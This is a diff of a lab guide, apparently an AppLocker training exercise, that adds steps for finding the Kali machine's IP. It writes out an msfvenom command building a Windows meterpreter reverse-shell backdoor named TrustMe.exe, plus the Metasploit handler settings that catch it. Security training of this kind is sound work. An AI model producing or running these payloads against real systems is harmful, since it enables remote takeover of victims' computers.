@@ -66,9 +66,17 @@ Run the following command to navigate into the mounted directory:
 
 <pre>cd /mnt/windows-share</pre>
 
-Run the following commands to start a simple backdoor and backdoor listener: 
+Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+<pre>ifconfig</pre>
+
+![](attachments/applocker_ifconfig.png)
+
+**REMEMBER: YOUR IP WILL BE DIFFERENT**
+
+Now, run the following commands to start a simple backdoor and backdoor listener: 
+
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
 Let's start the **Metasploit Handler**.  First, open a new **Kali** instance. The easiest way to do this is by clicking on the **Kali** icon in the taskbar.
 
@@ -90,7 +98,7 @@ Now run all of the following commands to set the correct parameters:
 
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-<pre>set LHOST [Your IP Address]</pre>
+<pre>set LHOST [Your Linux IP Address]</pre>
 
 **REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
 
